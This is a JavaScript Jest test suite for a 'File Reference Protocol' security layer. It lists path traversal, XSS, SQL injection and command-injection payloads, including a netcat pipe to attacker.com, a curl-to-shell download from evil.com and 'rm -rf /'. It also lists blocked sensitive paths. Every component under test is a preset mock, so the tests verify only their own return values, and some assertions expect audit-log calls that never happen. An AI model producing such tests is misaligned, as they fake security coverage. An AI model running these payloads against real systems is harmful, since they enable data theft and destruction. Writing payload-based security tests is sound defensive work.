/**
 * Feature 6: File Reference Protocol - Security Tests
 * Comprehensive security validation for file reference protocol
 * 
 * This test suite validates security measures including path traversal prevention,
 * access control, input sanitization, and protection against various attack vectors.
 */

const crypto = require('crypto');

// Mock File Reference Protocol with security features
const FileReferenceProtocol = {
  validatePath: jest.fn(),
  sanitizeInput: jest.fn(),
  checkPermissions: jest.fn(),
  detectPathTraversal: jest.fn(),
  validateFileType: jest.fn(),
  auditAccess: jest.fn(),
  rateLimit: jest.fn(),
  encryptResponse: jest.fn(),
};

// Mock security utilities
const SecurityUtils = {
  isAllowedPath: jest.fn(),
  hashPath: jest.fn(),
  checkFileIntegrity: jest.fn(),
  validateChecksum: jest.fn(),
  detectMaliciousContent: jest.fn(),
};

// Mock audit logger
const AuditLogger = {
  logAccess: jest.fn(),
  logSecurityEvent: jest.fn(),
  logSuspiciousActivity: jest.fn(),
};

describe('Feature 6: File Reference Protocol - Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Path Traversal Attack Prevention', () => {
    describe('Directory Traversal Attempts', () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/var/www/html/../../../etc/shadow',
        'file.txt/../../../etc/hosts',
        './legitimate/../../../etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
        '....//....//....//etc/passwd', // Double encoding
        '.%252e/.%252e/.%252e/etc/passwd', // Double URL encoding
        'file.txt\0../../../etc/passwd', // Null byte injection
        '../../../proc/self/environ',
        '../../../home/user/.ssh/id_rsa',
        '../../../../../../etc/passwd%00.jpg',
        '/etc/passwd%00',
        'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      ];

      test.each(pathTraversalPayloads)('should reject path traversal payload: %s', async (payload) => {
        FileReferenceProtocol.detectPathTraversal.mockReturnValue({
          isTraversal: true,
          severity: 'high',
          pattern: 'directory_traversal',
          payload: payload
        });

        FileReferenceProtocol.validatePath.mockResolvedValue({
          isValid: false,
          error: 'Path traversal attempt detected',
          code: 'SECURITY_VIOLATION',
          securityEvent: {
            type: 'path_traversal',
            severity: 'high',
            blocked: true
          }
        });

        AuditLogger.logSecurityEvent.mockResolvedValue({
          logged: true,
          eventId: 'sec-001',
          timestamp: new Date().toISOString()
        });

        const result = await FileReferenceProtocol.validatePath(payload);

        expect(result.isValid).toBe(false);
        expect(result.code).toBe('SECURITY_VIOLATION');
        expect(result.securityEvent.type).toBe('path_traversal');
        expect(AuditLogger.logSecurityEvent).toHaveBeenCalledWith(
          expect.objectContaining({
            type: 'path_traversal',
            payload: payload,
            blocked: true
          })
        );
      });
    });

    describe('Encoded Path Traversal Detection', () => {
      const encodedPayloads = [
        { input: '%2e%2e%2f', decoded: '../', description: 'URL encoded dot-dot-slash' },
        { input: '%252e%252e%252f', decoded: '../', description: 'Double URL encoded' },
        { input: '..%2f..%2f', decoded: '../..', description: 'Mixed encoding' },
        { input: '%c0%ae%c0%ae%c0%af', decoded: '../', description: 'UTF-8 overlong encoding' },
        { input: '..%5c..%5c', decoded: '..\\..\\', description: 'Backslash encoding' },
      ];

      test.each(encodedPayloads)('should detect encoded traversal: $description', async ({ input, decoded, description }) => {
        FileReferenceProtocol.sanitizeInput.mockReturnValue({
          original: input,
          decoded: decoded,
          containsTraversal: true,
          sanitized: 'blocked',
          securityFlags: ['encoded_traversal']
        });

        FileReferenceProtocol.validatePath.mockResolvedValue({
          isValid: false,
          error: 'Encoded path traversal detected',
          code: 'ENCODED_TRAVERSAL',
          details: {
            originalInput: input,
            decodedPayload: decoded,
            blocked: true
          }
        });

        const result = await FileReferenceProtocol.validatePath(input);

        expect(result.isValid).toBe(false);
        expect(result.code).toBe('ENCODED_TRAVERSAL');
        expect(result.details.decodedPayload).toBe(decoded);
      });
    });

    describe('Null Byte Injection Prevention', () => {
      const nullBytePayloads = [
        'legitimate.txt\0../../../etc/passwd',
        'file.pdf\0.exe',
        'safe/path\0/dangerous/path',
        'upload.jpg\0<?php phpinfo(); ?>',
        'config.json\0/etc/shadow',
      ];

      test.each(nullBytePayloads)('should block null byte injection: %s', async (payload) => {
        FileReferenceProtocol.sanitizeInput.mockReturnValue({
          original: payload,
          containsNullBytes: true,
          nullBytePositions: [payload.indexOf('\0')],
          sanitized: payload.replace(/\0.*/g, ''),
          securityFlags: ['null_byte_injection']
        });

        FileReferenceProtocol.validatePath.mockResolvedValue({
          isValid: false,
          error: 'Null byte injection detected',
          code: 'NULL_BYTE_INJECTION',
          securityEvent: {
            type: 'null_byte_injection',
            payload: payload,
            severity: 'high'
          }
        });

        const result = await FileReferenceProtocol.validatePath(payload);

        expect(result.isValid).toBe(false);
        expect(result.code).toBe('NULL_BYTE_INJECTION');
        expect(result.securityEvent.type).toBe('null_byte_injection');
      });
    });
  });

  describe('Access Control and Permissions', () => {
    describe('File Permission Validation', () => {
      test('should enforce read permission requirements', async () => {
        const testPath = '/workspaces/project/protected/sensitive.json';
        
        FileReferenceProtocol.checkPermissions.mockResolvedValue({
          path: testPath,
          permissions: {
            read: false,
            write: false,
            execute: false
          },
          owner: 'root',
          group: 'root',
          accessDenied: true,
          reason: 'Insufficient permissions'
        });

        const result = await FileReferenceProtocol.checkPermissions(testPath);

        expect(result.accessDenied).toBe(true);
        expect(result.permissions.read).toBe(false);
        expect(result.reason).toBe('Insufficient permissions');
      });

      test('should validate directory access permissions', async () => {
        const testPath = '/workspaces/project/admin/';
        
        FileReferenceProtocol.checkPermissions.mockResolvedValue({
          path: testPath,
          isDirectory: true,
          permissions: {
            read: true,
            write: false,
            execute: false // No execute permission on directory
          },
          accessDenied: true,
          reason: 'Directory traversal not permitted'
        });

        const result = await FileReferenceProtocol.checkPermissions(testPath);

        expect(result.accessDenied).toBe(true);
        expect(result.isDirectory).toBe(true);
        expect(result.permissions.execute).toBe(false);
      });
    });

    describe('Whitelist and Blacklist Enforcement', () => {
      test('should allow access to whitelisted paths', async () => {
        const whitelistedPaths = [
          '/workspaces/project/src/',
          '/workspaces/project/tests/',
          '/workspaces/project/docs/',
          '/workspaces/project/config/public.json'
        ];

        for (const allowedPath of whitelistedPaths) {
          SecurityUtils.isAllowedPath.mockReturnValue({
            allowed: true,
            reason: 'Path in whitelist',
            category: 'whitelisted'
          });

          FileReferenceProtocol.validatePath.mockResolvedValue({
            isValid: true,
            path: allowedPath,
            accessControlled: true,
            accessGranted: true
          });

          const result = await FileReferenceProtocol.validatePath(allowedPath);

          expect(result.isValid).toBe(true);
          expect(result.accessGranted).toBe(true);
        }
      });

      test('should deny access to blacklisted paths', async () => {
        const blacklistedPaths = [
          '/etc/',
          '/var/log/',
          '/proc/',
          '/sys/',
          '/dev/',
          '/root/',
          '/home/user/.ssh/',
          '/workspaces/project/.env',
          '/workspaces/project/node_modules/',
          '/workspaces/project/.git/',
        ];

        for (const blockedPath of blacklistedPaths) {
          SecurityUtils.isAllowedPath.mockReturnValue({
            allowed: false,
            reason: 'Path in blacklist',
            category: 'blacklisted',
            riskLevel: 'high'
          });

          FileReferenceProtocol.validatePath.mockResolvedValue({
            isValid: false,
            path: blockedPath,
            error: 'Access to path is restricted',
            code: 'ACCESS_DENIED',
            securityEvent: {
              type: 'blacklist_violation',
              path: blockedPath,
              severity: 'medium'
            }
          });

          const result = await FileReferenceProtocol.validatePath(blockedPath);

          expect(result.isValid).toBe(false);
          expect(result.code).toBe('ACCESS_DENIED');
          expect(result.securityEvent.type).toBe('blacklist_violation');
        }
      });
    });

    describe('File Type Restrictions', () => {
      test('should allow safe file types', async () => {
        const safeFileTypes = [
          'file.js', 'component.jsx', 'style.css', 'data.json',
          'test.spec.js', 'config.yaml', 'readme.md', 'schema.ts'
        ];

        for (const safeFile of safeFileTypes) {
          FileReferenceProtocol.validateFileType.mockReturnValue({
            allowed: true,
            fileType: safeFile.split('.').pop(),
            category: 'safe',
            reason: 'File type in allowed list'
          });

          const result = FileReferenceProtocol.validateFileType(safeFile);

          expect(result.allowed).toBe(true);
          expect(result.category).toBe('safe');
        }
      });

      test('should block dangerous file types', async () => {
        const dangerousFileTypes = [
          'malware.exe', 'script.bat', 'payload.sh', 'virus.com',
          'trojan.scr', 'backdoor.dll', 'rootkit.sys', 'keylogger.pif'
        ];

        for (const dangerousFile of dangerousFileTypes) {
          FileReferenceProtocol.validateFileType.mockReturnValue({
            allowed: false,
            fileType: dangerousFile.split('.').pop(),
            category: 'dangerous',
            reason: 'Executable file type blocked',
            riskLevel: 'critical'
          });

          AuditLogger.logSecurityEvent.mockResolvedValue({
            logged: true,
            eventType: 'dangerous_file_type_blocked'
          });

          const result = FileReferenceProtocol.validateFileType(dangerousFile);

          expect(result.allowed).toBe(false);
          expect(result.category).toBe('dangerous');
          expect(result.riskLevel).toBe('critical');
        }
      });
    });
  });

  describe('Input Sanitization and Validation', () => {
    describe('Malicious Input Detection', () => {
      test('should detect script injection attempts', async () => {
        const scriptPayloads = [
          '<script>alert("xss")</script>',
          'javascript:alert(1)',
          'data:text/html,<script>alert(1)</script>',
          'vbscript:msgbox("xss")',
          '"><script>alert(1)</script>',
          '\'><script>alert(String.fromCharCode(88,83,83))</script>',
        ];

        for (const payload of scriptPayloads) {
          SecurityUtils.detectMaliciousContent.mockReturnValue({
            isMalicious: true,
            threats: ['script_injection'],
            confidence: 0.95,
            payload: payload
          });

          FileReferenceProtocol.sanitizeInput.mockReturnValue({
            original: payload,
            sanitized: '',
            blocked: true,
            threats: ['script_injection'],
            securityFlags: ['malicious_content']
          });

          const result = FileReferenceProtocol.sanitizeInput(payload);

          expect(result.blocked).toBe(true);
          expect(result.threats).toContain('script_injection');
        }
      });

      test('should detect SQL injection patterns', async () => {
        const sqlPayloads = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "' UNION SELECT * FROM passwords --",
          "'; DELETE FROM files WHERE '1'='1' --",
          "' OR 1=1 #",
        ];

        for (const payload of sqlPayloads) {
          SecurityUtils.detectMaliciousContent.mockReturnValue({
            isMalicious: true,
            threats: ['sql_injection'],
            confidence: 0.9,
            payload: payload
          });

          FileReferenceProtocol.sanitizeInput.mockReturnValue({
            original: payload,
            sanitized: '',
            blocked: true,
            threats: ['sql_injection'],
            securityFlags: ['sql_injection_attempt']
          });

          const result = FileReferenceProtocol.sanitizeInput(payload);

          expect(result.blocked).toBe(true);
          expect(result.threats).toContain('sql_injection');
        }
      });

      test('should detect command injection attempts', async () => {
        const commandPayloads = [
          'file.txt; rm -rf /',
          'file.txt && cat /etc/passwd',
          'file.txt | nc attacker.com 1234',
          'file.txt; curl evil.com/steal.sh | sh',
          'file.txt`whoami`',
          'file.txt$(cat /etc/hosts)',
        ];

        for (const payload of commandPayloads) {
          SecurityUtils.detectMaliciousContent.mockReturnValue({
            isMalicious: true,
            threats: ['command_injection'],
            confidence: 0.85,
            payload: payload
          });

          FileReferenceProtocol.sanitizeInput.mockReturnValue({
            original: payload,
            sanitized: 'file.txt',
            blocked: false, // Sanitized but flagged
            threats: ['command_injection'],
            securityFlags: ['command_injection_attempt']
          });

          AuditLogger.logSecurityEvent.mockResolvedValue({
            logged: true,
            severity: 'high'
          });

          const result = FileReferenceProtocol.sanitizeInput(payload);

          expect(result.threats).toContain('command_injection');
          expect(result.sanitized).not.toContain(';');
          expect(result.sanitized).not.toContain('&&');
        }
      });
    });

    describe('Input Length and Format Validation', () => {
      test('should enforce maximum path length limits', async () => {
        const longPath = 'a/'.repeat(1000) + 'file.txt'; // Very long path

        FileReferenceProtocol.validatePath.mockResolvedValue({
          isValid: false,
          error: 'Path exceeds maximum length',
          code: 'PATH_TOO_LONG',
          limits: {
            maxLength: 4096,
            actualLength: longPath.length,
            exceeded: true
          }
        });

        const result = await FileReferenceProtocol.validatePath(longPath);

        expect(result.isValid).toBe(false);
        expect(result.code).toBe('PATH_TOO_LONG');
        expect(result.limits.exceeded).toBe(true);
      });

      test('should validate character set restrictions', async () => {
        const invalidCharPaths = [
          'file<name.txt',
          'file>name.txt',
          'file:name.txt',
          'file"name.txt',
          'file|name.txt',
          'file?name.txt',
          'file*name.txt',
        ];

        for (const invalidPath of invalidCharPaths) {
          FileReferenceProtocol.validatePath.mockResolvedValue({
            isValid: false,
            error: 'Invalid characters in path',
            code: 'INVALID_CHARACTERS',
            invalidChars: [invalidPath.match(/[<>:"|?*]/)[0]],
            sanitized: invalidPath.replace(/[<>:"|?*]/g, '_')
          });

          const result = await FileReferenceProtocol.validatePath(invalidPath);

          expect(result.isValid).toBe(false);
          expect(result.code).toBe('INVALID_CHARACTERS');
          expect(result.invalidChars).toBeDefined();
        }
      });
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    describe('Request Rate Limiting', () => {
      test('should enforce per-client rate limits', async () => {
        const clientId = 'client-123';
        const requests = Array.from({ length: 101 }, (_, i) => ({
          clientId,
          path: `/workspaces/project/file-${i}.js`,
          timestamp: Date.now() + i
        }));

        // First 100 requests should pass
        for (let i = 0; i < 100; i++) {
          FileReferenceProtocol.rateLimit.mockResolvedValueOnce({
            allowed: true,
            remaining: 100 - i - 1,
            resetTime: Date.now() + 60000
          });
        }

        // 101st request should be blocked
        FileReferenceProtocol.rateLimit.mockResolvedValueOnce({
          allowed: false,
          reason: 'Rate limit exceeded',
          retryAfter: 60,
          currentCount: 101,
          limit: 100
        });

        const results = await Promise.all(
          requests.map(req => FileReferenceProtocol.rateLimit(req))
        );

        expect(results.slice(0, 100).every(r => r.allowed)).toBe(true);
        expect(results[100].allowed).toBe(false);
        expect(results[100].reason).toBe('Rate limit exceeded');
      });

      test('should handle burst protection', async () => {
        const burstRequests = Array.from({ length: 20 }, (_, i) => ({
          clientId: 'burst-client',
          path: `/file-${i}.js`,
          timestamp: Date.now() // All at same time
        }));

        FileReferenceProtocol.rateLimit.mockImplementation(async (req) => {
          const isWithinBurstLimit = burstRequests.indexOf(req) < 10;
          return {
            allowed: isWithinBurstLimit,
            burstProtection: true,
            reason: isWithinBurstLimit ? null : 'Burst limit exceeded'
          };
        });

        const results = await Promise.all(
          burstRequests.map(req => FileReferenceProtocol.rateLimit(req))
        );

        const allowedCount = results.filter(r => r.allowed).length;
        expect(allowedCount).toBe(10);
        expect(results.some(r => r.reason === 'Burst limit exceeded')).toBe(true);
      });
    });

    describe('Resource Exhaustion Protection', () => {
      test('should limit concurrent file operations', async () => {
        const concurrentRequests = Array.from({ length: 50 }, (_, i) => 
          `/workspaces/project/concurrent-${i}.js`
        );

        FileReferenceProtocol.validatePath.mockImplementation(async (path) => {
          const requestNumber = parseInt(path.match(/concurrent-(\d+)/)[1]);
          const withinLimit = requestNumber < 20;
          
          return {
            isValid: withinLimit,
            error: withinLimit ? null : 'Too many concurrent operations',
            code: withinLimit ? 'SUCCESS' : 'RESOURCE_EXHAUSTION',
            concurrencyLimit: {
              current: Math.min(requestNumber + 1, 20),
              maximum: 20,
              exceeded: !withinLimit
            }
          };
        });

        const results = await Promise.all(
          concurrentRequests.map(path => FileReferenceProtocol.validatePath(path))
        );

        const successCount = results.filter(r => r.isValid).length;
        const blockedCount = results.filter(r => r.code === 'RESOURCE_EXHAUSTION').length;

        expect(successCount).toBe(20);
        expect(blockedCount).toBe(30);
      });

      test('should prevent memory exhaustion attacks', async () => {
        const largePayloadPath = 'a'.repeat(10 * 1024 * 1024); // 10MB path

        FileReferenceProtocol.validatePath.mockResolvedValue({
          isValid: false,
          error: 'Payload size exceeds memory limits',
          code: 'MEMORY_EXHAUSTION',
          limits: {
            maxPayloadSize: 1024 * 1024, // 1MB limit
            actualSize: largePayloadPath.length,
            exceeded: true
          },
          protection: {
            memoryExhaustionPrevention: true,
            requestTerminated: true
          }
        });

        const result = await FileReferenceProtocol.validatePath(largePayloadPath);

        expect(result.isValid).toBe(false);
        expect(result.code).toBe('MEMORY_EXHAUSTION');
        expect(result.protection.requestTerminated).toBe(true);
      });
    });
  });

  describe('File Integrity and Validation', () => {
    describe('File Checksum Validation', () => {
      test('should validate file integrity with checksums', async () => {
        const testFile = '/workspaces/project/src/critical.js';
        const expectedChecksum = 'a1b2c3d4e5f6789';

        SecurityUtils.checkFileIntegrity.mockResolvedValue({
          path: testFile,
          checksum: expectedChecksum,
          algorithm: 'sha256',
          valid: true,
          lastChecked: new Date().toISOString()
        });

        SecurityUtils.validateChecksum.mockResolvedValue({
          expected: expectedChecksum,
          actual: expectedChecksum,
          match: true,
          algorithm: 'sha256'
        });

        const integrityResult = await SecurityUtils.checkFileIntegrity(testFile);
        const checksumResult = await SecurityUtils.validateChecksum(
          testFile, 
          expectedChecksum
        );

        expect(integrityResult.valid).toBe(true);
        expect(checksumResult.match).toBe(true);
        expect(integrityResult.checksum).toBe(expectedChecksum);
      });

      test('should detect file tampering', async () => {
        const testFile = '/workspaces/project/src/tampered.js';
        const expectedChecksum = 'original123';
        const actualChecksum = 'tampered456';

        SecurityUtils.checkFileIntegrity.mockResolvedValue({
          path: testFile,
          checksum: actualChecksum,
          algorithm: 'sha256',
          valid: false,
          tampered: true,
          lastModified: new Date().toISOString()
        });

        SecurityUtils.validateChecksum.mockResolvedValue({
          expected: expectedChecksum,
          actual: actualChecksum,
          match: false,
          tamperingDetected: true,
          algorithm: 'sha256'
        });

        AuditLogger.logSecurityEvent.mockResolvedValue({
          logged: true,
          eventType: 'file_tampering_detected',
          severity: 'critical'
        });

        const result = await SecurityUtils.checkFileIntegrity(testFile);

        expect(result.valid).toBe(false);
        expect(result.tampered).toBe(true);
        expect(AuditLogger.logSecurityEvent).toHaveBeenCalledWith(
          expect.objectContaining({
            eventType: 'file_tampering_detected',
            severity: 'critical'
          })
        );
      });
    });

    describe('Malicious Content Scanning', () => {
      test('should scan files for malicious patterns', async () => {
        const suspiciousFile = '/workspaces/project/uploads/suspicious.js';
        const maliciousContent = 'eval(atob("bWFsaWNpb3VzIGNvZGU="))'; // base64 encoded malicious code

        SecurityUtils.detectMaliciousContent.mockResolvedValue({
          filePath: suspiciousFile,
          isMalicious: true,
          threats: ['obfuscated_code', 'eval_usage', 'base64_encoding'],
          confidence: 0.92,
          patterns: [
            { pattern: 'eval(', severity: 'high' },
            { pattern: 'atob(', severity: 'medium' },
          ],
          recommendation: 'Block file access'
        });

        FileReferenceProtocol.validatePath.mockResolvedValue({
          isValid: false,
          error: 'Malicious content detected',
          code: 'MALICIOUS_CONTENT',
          securityScan: {
            scanned: true,
            threats: ['obfuscated_code', 'eval_usage'],
            blocked: true
          }
        });

        const result = await FileReferenceProtocol.validatePath(suspiciousFile);

        expect(result.isValid).toBe(false);
        expect(result.code).toBe('MALICIOUS_CONTENT');
        expect(result.securityScan.blocked).toBe(true);
        expect(result.securityScan.threats).toContain('obfuscated_code');
      });
    });
  });

  describe('Audit Logging and Monitoring', () => {
    describe('Security Event Logging', () => {
      test('should log all security-related events', async () => {
        const securityEvents = [
          { type: 'path_traversal', severity: 'high', path: '../../../etc/passwd' },
          { type: 'access_denied', severity: 'medium', path: '/root/secret.txt' },
          { type: 'rate_limit_exceeded', severity: 'low', clientId: 'client-123' },
        ];

        for (const event of securityEvents) {
          AuditLogger.logSecurityEvent.mockResolvedValueOnce({
            logged: true,
            eventId: `sec-${Date.now()}`,
            timestamp: new Date().toISOString(),
            event: event
          });

          const result = await AuditLogger.logSecurityEvent(event);

          expect(result.logged).toBe(true);
          expect(result.eventId).toBeDefined();
          expect(result.event).toEqual(event);
        }
      });

      test('should track suspicious activity patterns', async () => {
        const suspiciousActivity = {
          clientId: 'suspicious-client',
          events: [
            { type: 'path_traversal', timestamp: Date.now() - 1000 },
            { type: 'access_denied', timestamp: Date.now() - 800 },
            { type: 'malicious_content', timestamp: Date.now() - 600 },
            { type: 'rate_limit_exceeded', timestamp: Date.now() - 400 },
          ],
          pattern: 'escalating_attacks',
          riskScore: 0.95
        };

        AuditLogger.logSuspiciousActivity.mockResolvedValue({
          logged: true,
          alertTriggered: true,
          riskScore: 0.95,
          recommendedAction: 'BLOCK_CLIENT',
          trackingId: 'suspicious-001'
        });

        const result = await AuditLogger.logSuspiciousActivity(suspiciousActivity);

        expect(result.alertTriggered).toBe(true);
        expect(result.riskScore).toBeGreaterThan(0.9);
        expect(result.recommendedAction).toBe('BLOCK_CLIENT');
      });
    });

    describe('Access Monitoring', () => {
      test('should monitor and log all file access attempts', async () => {
        const accessAttempts = [
          { path: '/workspaces/project/src/auth.js', result: 'success', user: 'dev-user' },
          { path: '/etc/passwd', result: 'blocked', user: 'suspicious-user' },
          { path: '/workspaces/project/config/secrets.json', result: 'denied', user: 'guest-user' },
        ];

        for (const attempt of accessAttempts) {
          AuditLogger.logAccess.mockResolvedValueOnce({
            logged: true,
            accessId: `access-${Date.now()}`,
            timestamp: new Date().toISOString(),
            attempt: attempt,
            ipAddress: '192.168.1.100',
            userAgent: 'FileReferenceProtocol/1.0'
          });

          const result = await AuditLogger.logAccess(attempt);

          expect(result.logged).toBe(true);
          expect(result.attempt).toEqual(attempt);
          expect(result.ipAddress).toBeDefined();
        }
      });
    });
  });

  describe('Response Security', () => {
    describe('Response Encryption', () => {
      test('should encrypt sensitive response data', async () => {
        const sensitiveResponse = {
          success: true,
          path: '/workspaces/project/config/database.json',
          metadata: {
            size: 1024,
            permissions: { read: true, write: true },
            containsSensitiveData: true
          }
        };

        FileReferenceProtocol.encryptResponse.mockResolvedValue({
          encrypted: true,
          data: 'encrypted_payload_here',
          algorithm: 'AES-256-GCM',
          keyId: 'key-001',
          iv: 'random_iv_here'
        });

        const result = await FileReferenceProtocol.encryptResponse(sensitiveResponse);

        expect(result.encrypted).toBe(true);
        expect(result.algorithm).toBe('AES-256-GCM');
        expect(result.keyId).toBeDefined();
        expect(result.iv).toBeDefined();
      });
    });

    describe('Information Disclosure Prevention', () => {
      test('should sanitize error messages to prevent information leakage', async () => {
        const internalError = new Error('/home/user/.ssh/id_rsa: Permission denied (internal path exposed)');

        FileReferenceProtocol.validatePath.mockResolvedValue({
          isValid: false,
          error: 'Access denied', // Sanitized message
          code: 'ACCESS_DENIED',
          internalError: null, // Internal details removed
          sanitized: true
        });

        const result = await FileReferenceProtocol.validatePath('/some/path');

        expect(result.error).toBe('Access denied');
        expect(result.error).not.toContain('/home/user/.ssh');
        expect(result.sanitized).toBe(true);
        expect(result.internalError).toBeNull();
      });

      test('should prevent directory enumeration through error messages', async () => {
        const testPaths = [
          '/workspaces/project/existing-dir/',
          '/workspaces/project/nonexistent-dir/'
        ];

        for (const testPath of testPaths) {
          FileReferenceProtocol.validatePath.mockResolvedValue({
            isValid: false,
            error: 'Access denied', // Same error for both cases
            code: 'ACCESS_DENIED',
            preventEnumeration: true
          });

          const result = await FileReferenceProtocol.validatePath(testPath);

          expect(result.error).toBe('Access denied');
          expect(result.preventEnumeration).toBe(true);
        }
      });
    });
  });

  describe('Security Configuration Validation', () => {
    test('should validate security configuration on startup', async () => {
      const securityConfig = {
        pathValidation: {
          enabled: true,
          strictMode: true,
          maxPathLength: 4096
        },
        accessControl: {
          enabled: true,
          whitelistEnabled: true,
          blacklistEnabled: true
        },
        rateLimit: {
          enabled: true,
          maxRequestsPerMinute: 100,
          burstLimit: 10
        },
        encryption: {
          enabled: true,
          algorithm: 'AES-256-GCM'
        }
      };

      FileReferenceProtocol.validatePath.mockImplementation(async () => ({
        configurationValid: true,
        securityFeatures: {
          pathValidation: securityConfig.pathValidation.enabled,
          accessControl: securityConfig.accessControl.enabled,
          rateLimit: securityConfig.rateLimit.enabled,
          encryption: securityConfig.encryption.enabled
        },
        allSecurityFeaturesEnabled: true
      }));

      const result = await FileReferenceProtocol.validatePath('test-config');

      expect(result.configurationValid).toBe(true);
      expect(result.allSecurityFeaturesEnabled).toBe(true);
      expect(result.securityFeatures.pathValidation).toBe(true);
      expect(result.securityFeatures.accessControl).toBe(true);
    });
  });
});